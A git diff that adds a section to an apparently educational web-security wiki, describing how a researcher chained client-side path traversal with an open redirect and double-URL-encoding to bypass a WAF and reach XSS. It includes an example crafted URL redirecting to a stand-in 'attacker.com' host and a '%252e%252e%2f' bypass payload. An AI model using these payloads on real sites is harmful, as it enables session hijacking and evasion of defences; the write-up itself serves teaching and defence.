@@ -400,6 +400,16 @@ When exploiting vulnerabilities in sinks, especially in the context of web appli
 
 <figure><img src="../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>
 
+## Bypass WAF By Encoding + CSPT
+
+In a recent hacking adventure, Matan Berson stumbled upon a sneaky vulnerability called Client-Side Path Traversal (CSPT). Picture a blog website where users view posts via a URL like `https://example.com/viewpost/543`. The site’s JavaScript grabs the post ID from the URL’s path and fetches content, but it doesn’t properly encode the input. Matan realized an attacker could slip in `../` sequences, tricking the site into requesting data from unexpected places, like `https://example.com/asdf`.
+
+The real mischief begins when this flaw meets an open redirect gadget on the site. By crafting a URL like `https://example.com/viewpost/..%2f..%2f..%2fredirect%3fu=https:%2f%2fattacker.com`, an attacker could redirect the request to their own malicious server, injecting harmful content and potentially triggering XSS to hijack a user’s session.
+
+But a Web Application Firewall (WAF) stood in Matan’s way, blocking requests with negative URL depth (too many `../`s). Undeterred, he noticed the WAF and the app decoded URLs differently. By playing with encoding levels—think of it like wrapping a gift in multiple layers of paper—he found a way to bypass the WAF. Using a payload like `%252e%252e%2f` (which the browser sees as `../`), he kept the WAF happy while still manipulating the app’s fetch request. In the end, Matan chained the CSPT with the redirect, sneaked past the WAF, and landed a successful XSS exploit, proving that clever encoding can unlock even well-guarded doors.
+
+<figure><img src="../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>
+
 ## Additional Resources
 
 *   ### Publications (blog posts, advisories, …) <a href="#publications-blog-posts-advisories" id="publications-blog-posts-advisories"></a>
